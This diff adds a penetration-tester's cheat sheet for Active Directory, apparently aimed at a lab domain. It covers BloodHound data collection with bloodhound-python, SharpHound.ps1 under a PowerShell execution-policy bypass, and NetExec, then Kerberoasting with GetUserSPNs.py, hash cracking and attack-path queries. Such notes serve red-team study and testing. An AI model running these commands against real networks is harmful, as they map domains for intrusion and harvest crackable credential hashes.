@@ -1,0 +1,39 @@
+============================================================
+[*] SET NEO4J PASSWORD
+/usr/share/neo4j/bin/neo4j-admin set-initial-password <password>
+neo4j start
+|
+v
+============================================================
+[+] Upload zip
+[+] Upload zip file into Bloodhound DB
+[+] Pre-Built Query:
+--> "SHORTEST PATH TO HIGH VALUE TARGETS"
+
+[+] CREDENTIALED ENUMERATION
+bloodhound-python -u '<AD_USER>' -p '<AD_PASS>' -d lab.local -c all -v -ns <NS_IP_is_DC> --zip
+
+[+] bloodhound.py -d lab.local -v --zip -c All -dc lab.local -ns 10.10.10.1
+bloodhound-python --dns-tcp -ns DOMAIN_IP -d lab.local -u 'username' -p 'password' -c all
+
+[+] SharpHound.ps1
+powershell -ev bypass
+. .\SharpHound.ps1
+Invoke-BloodHound -CollectionMethod All -Domain Kinetic.corp -zipFileName loot.zip
+
+[+] With NetExec
+NetExec ldap <ip> -u user -p pass --bloodhound --dns-server <ns-ip> --collection All
+
+[+] KERBEROAST with GetUserSPNs.py
+- SPN - Service Principle Name issued by Kerberos
+GetUserSPNs.py -request -dc-ip <DC_IP> lab.local/AD_USER
+[HASH-RECV]
+
+[+]CRACK HASH
+Remember that the Name Server (ns) is almost always +1 on the 4th octet from the Domain Controller.
+NOT always the case though.
+i.e. .20 for DC
+becomes .21 for NS
+
+# Find all machines, then right-click and shortest path to target.
+MATCH (n:Computer) RETURN n
